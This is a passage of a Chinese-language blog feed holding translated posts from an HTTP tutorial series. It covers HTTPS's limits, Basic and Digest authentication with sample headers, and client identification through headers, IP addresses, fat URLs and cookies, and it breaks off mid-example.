title="HTTPS的不足"></a>HTTPS的不足</h2><p>HTTPS有时会让人误以为当前站点是绝对安全的，实际上启用HTTPS机制只是提高了网站对某些认证攻击的防御能力，比如中间人攻击。但实际上，如果网站后端代码有问题，还是会存在一些其它漏洞，除了中间人攻击之外，还有很多种窃取用户信息的方式。</p><p>而且，如果HTTPS本身的设置有问题的话，依然可能发生中间人攻击。网站管理员可能会误以为，只要使用了HTTPS，就不存在中间人攻击了。</p><p>如果网站登录页面的后端代码存在漏洞，即使使用了HTTPS机制，也还是会导致用户账号密码泄露。所以，根本方法，要解决整个网站的安全问题，而不仅仅是企图依赖于HTTPS。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是<a href>HTTP系列</a>的全部了希望你可以从中受益, 或者(通过文章)你理解了你曾经不能理解的概念。</p><p>在写文章的过程中, 我获得了喜悦和大量的新知识。希望我的文章也能给你带来快乐(或者至少于都过程是享受的)。🙂</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;如果, 你伴随HTTP系列一路成长, 那么现在的你, 已经可以乘船开启(学习)HTTP安全之旅。我保证,你会很享受这个学习过程。🙂&lt;/p&gt;
&lt;p&gt;许多公司都是安全漏洞的受害者, 一些知名的公司, 比如Dropbox(支持文件同步、备份、共享云存储的软件)、Linkedin
      
    
    </summary>
    
    
      <category term="HTTP" scheme="http://Se8S0n.github.io.git/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>HTTP系列(四)：HTTP的基础概念概述</title>
    <link href="http://Se8S0n.github.io.git/2018/09/04/HTTP%E7%B3%BB%E5%88%97(%E5%9B%9B)/"/>
    <id>http://Se8S0n.github.io.git/2018/09/04/HTTP系列(四)/</id>
    <published>2018-09-04T22:21:21.000Z</published>
    <updated>2021-08-05T06:51:27.303Z</updated>
    
    <content type="html"><![CDATA[<p>在上一篇文章中, 我们讨论了网站用多种方法去标识浏览网站的用户(身份)。</p><p>标识本身仅仅表示一个声明, (用户通过声明)表明自己的身份, 然而除此之外, 并没有其他证据可以证明用户的身份。</p><p>认证, 用另一种方式来说, 就是用户证明自身身份的证据, 展示个人ID和输入用户密码是两种证明自身身份常见的方法。</p><p>通常情况下,只有通过认证, 网站才能为用户提供敏感资源。</p><p>HTTP自身拥有认证机制, 该机制允许服务器(向用户)提出质询并获取其所需的认证信息。你将会在文章中了解到什么是认证和认证是如何进行的。文章中还会涵盖每一种认证方式的优缺点, 并且分析它们是否具有独当一面的能力。(偷偷剧透一下, 它们才没这个能力呢！)</p><p>这篇文章是<a href>HTTP系列</a>的第四部分。</p><p>文章概要:</p><ul><li>HTTP认证的工作方式</li><li>Basic认证(基本认证)</li><li>Digest认证(摘要认证)</li></ul><p>在进一步探索什么是HTTP认证机制之前, 我们一起来看看什么是HTTP认证吧！</p><h2 id="HTTP认证的工作方式"><a href="#HTTP认证的工作方式" class="headerlink" title="HTTP认证的工作方式"></a>HTTP认证的工作方式</h2><p>认证是Web服务器标识用户的一种方式。用户需要摆出证据, 证明其有获得所请求资源的权限。通常, 证明的过程需要一组用户名和密码, 并且, 输入的用户名和密码必须经服务器(验证后)认同是有效的, 然后才由服务器判断该用户是否有获取该资源的权限。</p><p>HTTP提供了两种认证协议: </p><ul><li><strong>Basic认证(基本认证)</strong></li><li><strong>Digest认证(摘要认证)</strong></li></ul><p>在深入了解上述两个协议之前, 我们来大概过一遍基础概念。</p><h3 id="质询-challenge-响应-response-认证框架"><a href="#质询-challenge-响应-response-认证框架" class="headerlink" title="质询(challenge)/响应(response)认证框架"></a>质询(challenge)/响应(response)认证框架</h3><p>质询/响应认证是什么意思?</p><p>就是说, 在某个客户端发送请求的时候, 服务器不会立即响应, 而是(向客户端)返回<strong>认证要求</strong>。该认证要求要求用户通过输入私密信息(用户名及密码)来提供标识身份的证明。</p><p>之后, 客户端会重复发送请求来提供(身份)凭证, 如果该身份凭证被服务器认证是有效的, 那么用户可以得到所请求的响应资源。如果(身份)凭证被认为无效, 那么服务器会重新发出质询, 或直接发送(认证信息)错误报文。</p><p><em>注:加入用户名密码错误的话, 服务器会返回401</em></p><h3 id="与认证相关的请求-响应首部字段"><a href="#与认证相关的请求-响应首部字段" class="headerlink" title="与认证相关的请求/响应首部字段"></a>与认证相关的请求/响应首部字段</h3><p><strong>WWW-Authenticate响应首部字段</strong>, 是服务器用来(向客户端)发出质询的, 该首包含了认证协议和认证域这两部分内容。</p><p>在用户输入(身份)凭证之后, (客户端)会重新发送请求报文。然后, 客户端会发送附有<strong>Authorization首部字段</strong>的请求报文, 该首部字段包含了认证方式(Basic)和一组用户密码。</p><p>如果(身份)凭证通过验证, 服务器会返回响应, 并在响应中选用Authentication-Info首部字段附上附加信息——该首部字段是非必需的, 所以可有可无。</p><h3 id="安全认证域-Security-Realms"><a href="#安全认证域-Security-Realms" class="headerlink" title="安全认证域(Security Realms)"></a>安全认证域(Security Realms)</h3><p>认证域(又称防护域, protection space)在服务器上提供了<strong>不同访问权限关联不同资源组的方法</strong>。</p><p>实际上, 认证域的存在就意味着, 用户访问(不同的)资源需要输入不同的身份凭证。</p><p>服务器拥有多个认证域。</p><p>/admin/statistics/financials.txt -&gt; Realm=”Admin Statistics”<br>比如, 上面的示例就是存放网站统计信息的认证域——只允许网站管理员访问(其中的资源)。</p><p>/images/img1.jpg -&gt; Realm = “Images”<br>还有存放网站图片的认证域——即使不是管理员, 也能访问和上传图片。</p><p>当你尝试访问”financials.txt”时, 服务器会向你发出质询, 并返回如下响应:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 401 Unauthorized</span><br><span class="line">WWW-Authenticate: Basic realm=&quot;Admin Statistics&quot;</span><br></pre></td></tr></table></figure></p><p>点击<a href="https://tools.ietf.org/html/rfc7235#section-2.2" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7235#section-2.2</a>可了解更多认证域。</p><h3 id="简单的HTTP认证实例"><a href="#简单的HTTP认证实例" class="headerlink" title="简单的HTTP认证实例"></a>简单的HTTP认证实例</h3><p>现在, 让我们用简单的HTTP认证实例为这一小节内容画上一个完美的句号吧!(basic认证会在后文继续讲述)</p><ol><li><p>用户代理 -&gt; 服务器<br>用户请求访问服务器上的图片。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /gallery/personal/images/image1.jpg HTTP/1.1</span><br><span class="line">Host: www.somedomain.com</span><br></pre></td></tr></table></figure></li><li><p>服务器 -&gt; 用户代理<br>服务器(向客户端)发送认证要求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 401 Access Denied</span><br><span class="line">WWW-Authenticate: Basic realm=&quot;gallery&quot;</span><br></pre></td></tr></table></figure></li><li><p>用户代理 -&gt; 服务器<br>用户通过表单输入标识自己。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /gallery/personal/images/image1.jpg HTTP/1.1</span><br><span class="line">Authorization: Basic Zm9vOmJhcg==</span><br></pre></td></tr></table></figure></li><li><p>服务器 -&gt; 用户代理<br>服务器验证(身份)凭证成功后, 发送状态码”200 OK”及图片。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-type: image/jpeg</span><br><span class="line">...&lt;image data&gt;</span><br></pre></td></tr></table></figure></li></ol><p>看起来不是那么复杂, 对吗?</p><p>现在, 我们来进入更深层次的学习, 学习basic认证。</p><h2 id="basic认证"><a href="#basic认证" class="headerlink" title="basic认证"></a>basic认证</h2><p>basic认证是最常用且支持面最广的认证协议。从HTTP/1.0开始, basic认证就已经广泛应用了, 每一个客户端都可以使用该认证协议认证。</p><p>上面的实例描述的是basic认证过程。basic认证实现和用起来都很简单, 不过, 它存在着安全问题。</p><p>进入(basic认证)安全问题的学习之前, 不妨先了解一下basic认证是如何处理(认证过程中传输的)用户和密码的。</p><p>basic认证将用户名及密码放在一串字符串中, 两者由符号”:”分割。然后, 用<a href="https://zh.wikipedia.org/wiki/Base64" target="_blank" rel="noopener">base64编码</a>字符串。不过, 无论字符串的表现形式是什么样, 混乱的字符顺序也不能保证(认证)安全, 因为它可以被轻易地解开。</p><p>实际上, base64编码不是为了加密, 而是为了保证用户名及密码在通过HTTP协议传输之后具有可移植性。不过,在HTTP首部字段中不能使用通用字符, 才是编码的主要原因。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /gallery/personal/images/image1.jpg HTTP/1.1</span><br><span class="line">Authorization: Basic Zm9vOmJhcg==</span><br></pre></td></tr></table></figure><p>例子中的字符串”Zm9vOmJhcg==”解码后只是”foo:bar”(这一小段字符串)。</p><p>因此, 每个可以收到请求的(代理/服务器)都能轻易地解码和使用(传输的身份)凭证。</p><p>更糟糕的是, 恶意的第三方<strong>仍然可以通过发送(编码后的)混乱字符序列达到同样的效果</strong>, 因此对用户名及密码进行编码不会有任何帮助。</p><p>没有任何可以用来防止代理或其他形式的攻击篡改请求主体(数据), 同时还能保证请求主体完好无损的措施。</p><p>因此, 如你所见, basic认证称不上是一个完美的认证机制。</p><p>尽管如此, basic认证还是可以用来防止(无权限用户)意外访问受保护的资源, 并(为用户)提供一定程度的个性化内容。</p><p>为了让(认证)更加安全实用, 可以用基于SSL的HTTPS协议对basic认证进行扩展, 相关内容我们会在本系列的第五部分详述。</p><p>然而, 有些人认为, <a href="https://www.skorks.com/2009/08/is-basic-authentication-really-insecure/" target="_blank" rel="noopener">basic认证的安全与否取决于运输机制(的安全性)</a>。</p><h2 id="digest-摘要-认证"><a href="#digest-摘要-认证" class="headerlink" title="digest(摘要)认证"></a>digest(摘要)认证</h2><p>与简单且不安全的basic认证相比, digest认证是一个更加安全可靠的选择。</p><p>那么, 它是如何认证的呢？</p><p>digest认证将多个<strong><a href="https://zh.wikipedia.org/wiki/Nonce" target="_blank" rel="noopener">nonce</a></strong>与<strong>MD5哈希加密算法</strong>结合使用, 以此来隐藏密码(使账号)免于遭受多种恶意攻击的侵害。</p><p><em>注: nonce本身是用base64加密的。</em><br><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Nonce-cnonce-uml.svg/345px-Nonce-cnonce-uml.svg.png" alt></p><p>这个(认证过程)听起来好像很复杂, 不过在你看完实例之后, 就会觉得清晰多了。</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ol><li><p>用户代理 -&gt; 服务器</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /dir/index.html HTTP/1.0</span><br><span class="line">Host: localhost</span><br></pre></td></tr></table></figure><p> 客户端发送不含认证(信息)的请求。</p></li><li><p>服务器 -&gt; 用户代理</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 401 Unauthorized</span><br><span class="line">WWW-Authenticate: Digest realm=&quot;shire@middleearth.com&quot;,</span><br><span class="line">                        qop=&quot;auth,auth-int&quot;,</span><br><span class="line">                        nonce=&quot;cmFuZG9tbHlnZW5lcmF0ZWRub25jZQ&quot;,</span><br><span class="line">                        opaque=&quot;c29tZXJhbmRvbW9wYXF1ZXN0cmluZw&quot;</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 153</span><br><span class="line">&lt;--空行--!&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;Error&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;401 Unauthorized.&lt;/h1&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p> 服务器对客户端发出质询, 要求其用digest认证进行认证, 并向客户端发送(认证时)所需的信息。</p></li><li><p>用户代理 -&gt; 服务器</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /dir/index.html HTTP/1.0</span><br><span class="line">Host: localhost</span><br><span class="line">Authorization: Digest username=&quot;Gandalf&quot;,</span><br><span class="line">                     realm=&quot;shire@middleearth.com&quot;,</span><br><span class="line">                     nonce=&quot;cmFuZG9tbHlnZW5lcmF0ZWRub25jZQ&quot;,</span><br><span class="line">                     uri=&quot;/dir/index.html&quot;,</span><br><span class="line">                     qop=auth,</span><br><span class="line">                     nc=00000001,</span><br><span class="line">                     cnonce=&quot;0a4f113b&quot;,</span><br><span class="line">                     response=&quot;5a1c3bb349cf6986abf985257d968d86&quot;,</span><br><span class="line">                     opaque=&quot;c29tZXJhbmRvbW9wYXF1ZXN0c</span><br></pre></td></tr></table></figure><p> 客户端将计算出响应码与用户名、认证域(real)、URI、nonce(随机数)、opaque、qop、nc和cnonce(客户端的随机数)这些属性一起发送出去, 这信息量真的很大。</p></li><li><p>服务器 -&gt; 客户端</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 2345</span><br><span class="line">... &lt;content data&gt;</span><br></pre></td></tr></table></figure><p> 服务器会自己计算(服务器产生的nonce)的哈希值并与从客户端收到的nonce哈希值进行比对。若两者相同, 服务器就会发送(客户端)所请求的数据。</p></li></ol><h3 id="步骤3的-详细说明"><a href="#步骤3的-详细说明" class="headerlink" title="(步骤3的)详细说明"></a>(步骤3的)详细说明</h3><p>定义：</p><ul><li>nonce、opaque —— 服务器生成的字符串, 客户端会在返回的内容中附上该信息。</li><li>qop(保护质量) —— 可设置一个或多个值(“auth” | “auth-in” | token)。这些值影响摘要(信息)的计算。</li><li>cnonce - 客户端随机数, 若设置了qop的值, 一定要生成客户端随机数。它是用来防止<a href="https://zh.wikipedia.org/wiki/%E9%80%89%E6%8B%A9%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">选择明文攻击</a>和保证信息完整性的。</li><li>nc —— 若qop设置了, 必须(给服务器)发送该属性。服务器可通过nc属性的值, 检测请求是否是重新发送过来的。若(两次请求)nc属性出现了相同值, 那么说明该请求重新发送了一次。</li></ul><p>response属性的值的计算方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HA1 = MD5(&quot;Gandalf:shire@middleearth.com:Lord Of The Rings&quot;)</span><br><span class="line">       = 681028410e804a5b60f69e894701d4b4</span><br><span class="line"> </span><br><span class="line">HA2 = MD5(&quot;GET:/dir/index.html&quot;)</span><br><span class="line">       = 39aff3a2bab6126f332b942af96d3366</span><br><span class="line"> </span><br><span class="line">Response = MD5( &quot;681028410e804a5b60f69e894701d4b4:</span><br><span class="line">                 cmFuZG9tbHlnZW5lcmF0ZWRub25jZQ:</span><br><span class="line">                 00000001:0a4f113b:auth:</span><br><span class="line">                 39aff3a2bab6126f332b942af96d3366&quot; )</span><br><span class="line">         = 5a1c3bb349cf6986abf985257d968d86</span><br></pre></td></tr></table></figure></p><p>如果你对response属性是如何受qop属性影响这件事感兴趣的话, 你可以看看<a href="https://www.ietf.org/rfc/rfc2617.txt" target="_blank" rel="noopener">RFC 2617</a>。</p><h3 id="简短的总结"><a href="#简短的总结" class="headerlink" title="简短的总结"></a>简短的总结</h3><p>如你所见, digest认证不管是理解起来还是实现起来都(比basic认证)复杂多了。</p><p>尽管, digest认证比basic认证安全得多, 但还是存在遭受中间人攻击的可能。</p><p>RFC 2617中提到, digest认证是用于取代basic认证的, 因为它可弥补basic认证的不足, 同时RFC 2617中没有将digest认证仍旧不符合现代密码标准的事实隐藏起来, 不过, 该认证安全与否, 还是取决于实际实施情况。</p><p>digest认证的优点:</p><ul><li>不会在网络中发送明文密码</li><li>防止重放攻击</li><li>防止篡改报文</li></ul><p>digest认证的缺点:</p><ul><li>易遭受中间人攻击</li><li>不用设置大量的安全选项, 导致digest认证方法不够安全</li><li>存储密码时, 不能使用强密码哈希函数</li></ul><p><em>注: 缺点的最后一点, 是因为无论是密码、用户名、realm、密码的摘要都要求是可恢复的</em></p><p>上述的种种缺点使得digest认证未能大力推广, 反观简单的basic认证, 结合SSL使用之后比(复杂的)digest认证安全得多——因此该认证方法得到大力推广。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文为HTTP系列的一部分。</p><p>文章看到这里, 我们大致过了一遍HTTP默认提供的认证机制, 并且谈论了不同认证机制的优缺点。</p><p>希望(对你来说)这些概念不再只是屏幕上的单词, 并且下次你提到这些名词的时候, 能准确地知道它们是什么和怎么运用它们。</p><p>你应该察觉到了, 上述认证机制并不能规避(所有)安全风险, 这就是HTTPS、SSL/TLS(Transport Layer Security, 传输层安全性协定)这些概念存在的原因。下一篇文章, 我们将会更多地去讨论安全问题和如何去规避这些问题。</p><p>如果你感觉有些概念不是很清晰, 你可以看看<a href>HTTP系列</a>的<a href>第一部分</a>、<a href>第二部分</a>和<a href>第三部分</a>。</p><h2 id="安全小讲堂"><a href="#安全小讲堂" class="headerlink" title="安全小讲堂"></a>安全小讲堂</h2><p>  在找相关知识的时候, 发现有一个人用了一个很通俗易懂的方式来讲密码学里面的知识, 感觉很有趣。今天来尝试一波。</p><p>  假设小明和小兰互相不认识, 在老师严抓早恋的背景下, 俩人都学习了写情书的新姿势, 将自己写的文字加密并发出, 然后通过情书培养感情。小草也喜欢小兰, 为了阻(heng)止(dao)他(duo)们(ai), 采取了以下攻击方式。</p><ol><li><p>选择明文攻击<br> 小草很了解小兰(但没有学习过上面的新姿势), 知道小兰最爱在信里表示自己很”开心”, 所以信加密后出现最高频率的词, hexo这就是知道”开心”加密之后的密文是啥了。<br> ————已知密文。</p><p> 如果有一天, 小兰写”开心”的次数变少了, 小草就可以找机会雪(chen)中(xu)送(er)炭(ru)了。</p></li><li><p>中间人攻击<br> 小明和小兰协商好, 在书信里面放入自己的信物表明自己的身份, 为了防止第三者做些乱七八糟的事情, 这个方式也是很明智了。但是未曾想, 小草在一开始协商信物的时候, 就窃取了他们的信物——这个信物就是公钥——并且将自己事先准备好的两个信物与小明和小兰原本的信物进行对调。</p><p> <img src="http://res.cloudinary.com/dq4c0zqqy/image/upload/v1536501208/HTTP/mim.png" alt><br> 这时候小草甚至还能皮一下, 篡改小明的书信, 离间他们两者之间的感情。</p></li><li><p>重放攻击<br> 小明给小兰送情书之前, 都会在小兰的桌上放一瓶酸奶, 作为自己给小兰写信的信号。小兰回教室看到抽屉里有信, 在思考是谁写的(发出质询), 看到酸奶(收到响应), 小兰就知道是小明给自己写情书了(通过验证)。小草找到了这个规律, 同样给小兰桌上放了一瓶酸奶(重放攻击, 二次利用认证信息), 之后在抽屉里放着离间两人的信, 这就达成了小草想要的效果。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在上一篇文章中, 我们讨论了网站用多种方法去标识浏览网站的用户(身份)。&lt;/p&gt;
&lt;p&gt;标识本身仅仅表示一个声明, (用户通过声明)表明自己的身份, 然而除此之外, 并没有其他证据可以证明用户的身份。&lt;/p&gt;
&lt;p&gt;认证, 用另一种方式来说, 就是用户证明自身身份的证据, 
      
    
    </summary>
    
    
      <category term="HTTP" scheme="http://Se8S0n.github.io.git/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>HTTP系列(三)：客户端标识</title>
    <link href="http://Se8S0n.github.io.git/2018/08/24/HTTP%E7%B3%BB%E5%88%97(%E4%B8%89)/"/>
    <id>http://Se8S0n.github.io.git/2018/08/24/HTTP系列(三)/</id>
    <published>2018-08-24T19:51:05.000Z</published>
    <updated>2021-08-05T06:51:27.295Z</updated>
    
    <content type="html"><![CDATA[<p>到现在, 你已经了解HTTP的基本概念及其体系结构, 那么, 就可以让进入下一个重要的部分——客户端标识。</p><p>你知道为什么客户端识别那么重要吗? 你知道Web服务器是怎样识别你所用的客户端的吗?你知道怎样使用和存储这些身份信息吗?看完这篇文章, 你的这些问题都能迎刃而解。</p><p>这篇文章是<a href>HTTP系列</a>的第三部分。</p><p>文章概要:</p><ul><li><a href>客户端识别及其重要性</a></li><li><a href>客户端识别的多种方式</a></li><li><a href>用于识别的HTTP请求首部字段</a></li><li><a href>IP地址</a></li><li><a href>长(胖)URL</a></li><li><a href>Cookies</a></li></ul><p>首先, 让我们了解一下, 为什么网站要识别客户端?</p><h2 id="客户端识别及其重要性"><a href="#客户端识别及其重要性" class="headerlink" title="客户端识别及其重要性"></a>客户端识别及其重要性</h2><p>正如你(可以)很清楚地意识到的一样, 每一个网站, 至少是那些关心你(客户端)和你的操作的网站, 都存在以某种形式呈现的内容个性化。</p><p>然而, 我想通过网站的这个特性表达什么呢？</p><p>所谓的内容个性化, 就是(在网页上添加)建议项, 建议项包括: 商务网站上或社交网站上推荐的视频、像蛔虫一般知晓你的需要的广告、与你有关联的新闻、社交网站上的好友推荐等等。</p><p>这个特性看起来像是一把双刃剑。一方面, 这个特性做的非常好的一点是,提供给你个性化定制的内容。而另一方面, 该特性带来的<a href="https://zh.wikipedia.org/wiki/%E7%A2%BA%E8%AA%8D%E5%81%8F%E8%AA%A4" target="_blank" rel="noopener">确认偏误</a>会造成刻板印象和偏见。迪尔伯特有一套优秀的漫画涉及到了确认偏误。</p><p><em>注：该漫画的地址<a href="http://dilbert.com/strip/2011-07-02" target="_blank" rel="noopener">http://dilbert.com/strip/2011-07-02</a></em></p><p>然而, 我们怎么能不知道我们最喜欢的球队昨晚的得分? 怎么能不知道昨晚公众人物们干了些啥？</p><p>无论从哪一方面考虑, 个性化的内容都已经成为了我们日常生活中的一部分了, 我们不能，甚至连想不可能想去限制内容个性化。</p><p>接下来, 就让我们了解一下Web服务器是如何通过识别你的身份实现内容个性化的。</p><h2 id="客户端识别的多种方式"><a href="#客户端识别的多种方式" class="headerlink" title="客户端识别的多种方式"></a>客户端识别的多种方式</h2><p>识别客户端具有多种方式:</p><ul><li><strong>HTTP请求首部</strong></li><li><strong>IP地址</strong></li><li><strong>长URLs</strong></li><li><strong>Cookies</strong></li><li><strong>登陆信息(认证)</strong></li></ul><p>下面, 我们将上面的每一种方法大致过一遍吧！HTTP认证会在<a href>HTTP系列</a>的<a href>第四部分</a>进行更加详细的介绍。</p><h2 id="用于识别的HTTP请求首部字段"><a href="#用于识别的HTTP请求首部字段" class="headerlink" title="用于识别的HTTP请求首部字段"></a>用于识别的HTTP请求首部字段</h2><p>Web服务器可以通过一些方法, 直接从HTTP请求首部字段中提取客户端的相关信息。</p><p>这些首部字段是:</p><ul><li><strong>From -</strong> 若客户端有提供, 则含有用户(客户端或代理)的电子邮件地址</li><li><strong>User-Agent -</strong> 含有客户端的信息</li><li><strong>Referer -</strong> 含有用户所请求的原始资源(的URI)</li><li><strong>Authorization -</strong> 含有用户名及密码</li><li><strong>Client-ip -</strong> 含有用户的IP地址</li><li><strong>X-Forwared-For -</strong> 含有用户的IP地址(通过代理服务器时使用)</li><li><strong>Cookie -</strong> 含有服务器端生成的ID</li></ul><p>理论上, <strong>From首部字段</strong>是用户理想的唯一标识, 但实际上, 由于会造成收集电子邮件地址这种安全性问题, 因此该首部字段很少用到。</p><p><em>注: 国外有专门形容收集电子邮件地址的词组-<a href="https://attack.mitre.org/wiki/Technique/T1114" target="_blank" rel="noopener">email collection</a>, 词组原意应该是“收集电子邮件数据”, 但是因为From这个首部字段含有的是电子邮件的地址, 因此翻译为”收集电子邮件地址”。</em></p><p><strong>User-agent首部字段</strong>含有浏览器版本、操作系统的信息。尽管这些信息对自定义内容来说很重要, 但它还是不能(帮服务器)用更恰当的方式去识别用户。</p><p><strong>Referer首部字段</strong>告知服务器用户的请求是从哪个Web页面发起的。该信息有助于(服务器)分析用户行为, 但较少识别该首部字段内容。</p><p><em>注: 我大概查了一下为什么作者会说很少识别该首部字段内容。看完《图解HTTP》，我是这样理解的, 当直接在浏览器的地址栏输入URI, 或其他安全性考虑时, 客户端可以不发送该首部字段, 因为URI的查询字符串中可能含有ID和密码等保密信息, 若写进去有可能导致信息泄露。所以服务器就很少识别该首部字段的内容。如果想更深入了解Referer首部字段, 可以看一下<a href="https://www.sojson.com/blog/58.html" target="_blank" rel="noopener">https://www.sojson.com/blog/58.html</a></em></p><p>虽然这些首部字段(给服务器)提供了有用的客户端信息, 不过, 如果想有效地实现内容个性化, 这是远远不够的。</p><p>剩余的首部字段(为服务器)提供了更准确的识别机制。</p><h2 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h2><p>过去, IP地址不易被伪造或交换, 因此IP地址可用于识别客户端。但是(检查)IP地址可以被当作一个额外的安全检查, 毕竟只检查IP地址, 还是不够可靠。</p><p>下面列出的, 是其不可靠的原因:</p><ul><li>IP地址<strong>描述机器</strong>, 而不是用户</li><li><strong>NAT防火墙 -</strong> 许多ISP(Internet service provider, 互联网服务供应商)用NAT防火墙提高安全性和弥补IP地址的不足</li><li><strong>动态IP地址 -</strong> 用户通常都是从ISP获取动态IP地址</li><li><strong>HTTP代理和网关 -</strong> 代理和网关可用于隐藏真实IP地址。某些代理通过Client-ip请求首部字段或X-Forwarded-For请求首部字段来保留真实IP地址。</li></ul><h2 id="长-胖-URL"><a href="#长-胖-URL" class="headerlink" title="长(胖)URL"></a>长(胖)URL</h2><p>在用户浏览页面时, 网站会在URL中添加更多的信息, 直至URL看起来很复杂且难以读懂。</p><p>下面举浏览亚马逊商店的例子能很好地告诉你, 胖URL长得啥样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.amazon.com/gp/product/1942788002/ref=s9u_psimh_gw_i2?i</span><br></pre></td></tr></table></figure><p>在使用胖URL的时候, 有以下缺点:</p><ul><li>看起来很丑</li><li>不可共享</li><li>破坏缓存</li><li>会话(session)受限</li><li>给服务器增加负载</li></ul><p><em>注: 这里大概解释一下这些缺点。首先, “不可共享”是因为共享的话可能会造成个人隐私泄露等安全问题。”破坏缓存”则是因为, 胖URL实际上是为每个用户生成特定版本的URL, 这就会造成没有可供公共访问的缓存了。之后, “会话受限”, 我们应该知道会话内容会在关闭浏览器之后消失, 除非用户收藏了特定的胖URL, 否则一旦用户退出登录, 所有会话期间的内容都会消失。而”增加负载”则是因为将URL重写会生成负荷。若想更进一步了解胖URL, 可参考：<a href="http://gcidea.info/2016/05/11/fat-url/" target="_blank" rel="noopener">http://gcidea.info/2016/05/11/fat-url/</a></em></p><h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>Cookie是现在除了认证(authentication)之外最好的标识客户端方法, 它是由网景公司提出的, 现如今, 每一个浏览器都支持cookie。</p><p>Cookie分为两类: 会话Cookie和持久性Cookie。会话Cookie在(用户)关闭浏览器时会被删除, 而持久性cookie则会(比会话Cookie)更长久地保存在硬盘中。若想将会话Cookie作为持久性Cookie来使用, 仅需设置Max-Age首部字段或Expiries属性。</p><p>现代浏览器(例如Chrome、Firefox)在用户关闭浏览器后, 可以让后台进程一直运行， 以便用户从(进程)中断处恢复进程。这可能会导致(浏览器)会保留绘画cookie, 因此要小心一点。</p><p>那cookie到底是怎么工作的呢？</p><p>Cookie含有一个键值对列表, 该列表是服务器通过Set-Cookie或Set-Cookie2两种响应首部字段设置的。通常, Cookie存储的信息会是某种客户ID, 但是有些网站也会(在其中)存储其他信息。</p><p>浏览器将Cookie信息储存在Cookie数据库中, 并在用户下次访问该页面或网站时返回Cookie。浏览器可以处理成千上万不同的cookie, 并且知道每一个cookie什么时候提供(给用户)。</p><p>下面为(使用Cookie的)流程的示例。</p><ol><li><p>用户代理(User Agent) -&gt; 服务器 </p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /acme/login HTTP/1.1</span><br><span class="line">[form data]</span><br></pre></td></tr></table></figure><p> 用户(代理)通过表单输入的内容识别用户。</p></li><li><p>服务器 -&gt; 用户代理</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie2: 